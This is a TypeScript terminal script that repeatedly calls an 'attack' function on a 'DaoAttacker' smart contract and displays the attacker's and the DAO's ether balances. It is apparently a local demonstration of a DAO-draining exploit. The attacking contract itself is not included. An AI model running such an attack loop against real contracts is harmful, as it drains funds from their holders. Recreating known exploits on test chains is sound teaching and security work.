import React, { useState, useEffect } from 'react'
import { render, Text, Box } from 'ink'
import { formatEther } from 'viem'
import { Dao, DaoAttacker } from '../codegen/addresses.ts'
import { abis } from '../codegen/abis.ts'
import { wallet } from '../tools/lib/index.ts'

// Fetch the current balances of the attacker and the DAO.
async function fetchBalances() {
    return Promise.all([
        wallet.getBalance({ address: DaoAttacker }),
        wallet.getBalance({ address: Dao }),
    ])
}

// call 'attack' on the DaoAttacker contract in a loop.
async function attack() {
    const { request } = await wallet.simulateContract({
        address: DaoAttacker,
        abi: abis.DaoAttacker,
        functionName: 'attack',
    })

    const hash = await wallet.writeContract(request)
    let receipt = await wallet.waitForTransactionReceipt({
        hash,
    })

    console.assert(receipt.status === 'success', 'Transaction failed')
    setTimeout(attack, 0)
}

// Get the initial balances.
const initialBalances = await fetchBalances()

// Start the attack loop.
setTimeout(attack, 0)

// Render both balances in the terminal.
const App = () => {
    const [[attacker, dao], setBalances] = useState(initialBalances)

    // Fetch the balances every second.
    useEffect(() => {
        const interval = setInterval(
            () => fetchBalances().then(setBalances),
            1000
        )
        return () => clearInterval(interval)
    }, [])

    return (
        <Box flexDirection="column">
            <Text>🏴‍☠️ Attacker balance: {formatEther(attacker)}</Text>
            <Text>🏛️ DAO balance: {formatEther(dao)}</Text>
        </Box>
    )
}

render(<App />)
